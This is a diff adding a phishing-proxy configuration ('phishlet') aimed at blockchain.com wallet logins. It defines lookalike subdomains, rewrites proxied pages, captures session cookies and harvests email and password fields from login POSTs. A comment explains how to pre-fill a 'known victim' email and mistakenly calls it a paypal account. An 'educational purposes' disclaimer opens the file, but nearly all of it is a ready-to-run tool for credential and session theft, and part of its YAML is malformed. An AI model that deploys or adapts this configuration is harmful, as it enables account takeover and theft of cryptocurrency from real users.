@@ -1,0 +1,59 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+# Email Params can be Triggered By using Below Command.
+# lures edit params ID email=test@email.com
+# Where ID is lure id number, and test@email.com is your known victim account email address for paypal. 
+
+author: 'YoungMoney01'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: 'login', domain: 'blockchain.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'www', domain: 'blockchain.com', session: true, is_landing: true, auto_filter: true}
+# - {phish_sub: 'login', orig_sub: 'www', domain: 'blockchain.com', session: false, is_landing: false}
+# - {phish_sub: 'account', orig_sub: 'login', domain: 'blockchain.com', session: false, is_landing: false}
+  - {phish_sub: 'connect', orig_sub: 'login', domain: 'blockchain.com', session: true, is_landing: true}
+  - {phish_sub: 'secure', orig_sub: 'login', domain: 'blockchain.com', session: true, is_landing: true}
+  - {phish_sub: 'connect', orig_sub: 'login', domain: 'blockchain.com', session: false, is_landing: false}
+  - {phish_sub: '', orig_sub: 'login', domain: 'blockchain.com', session: false, is_landing: false}
+ 
+sub_filters:
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+# - {triggers_on: 'login.blockchain.com', orig_sub: '', domain: 'blockchain.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+# - {triggers_on: 'login.blockchain.com', orig_sub: '', domain: 'blockchain.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.blockchain.com'
+    keys: ['.*,regexp','session']
+  - domain: '.blockchain.com'
+    keys: ['session','_visit','id']
+ # - domain: 'auth.blockchain.com'
+    keys: ['sid','ver,opt']
+auth_urls:
+  - '/myaccount/summary'
+  - '/myaccount/.*'     
+    
+credentials:
+  username:
+    key: 'email_username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'login.blockchain.com'
+  path: '/#/login?product=wallet'
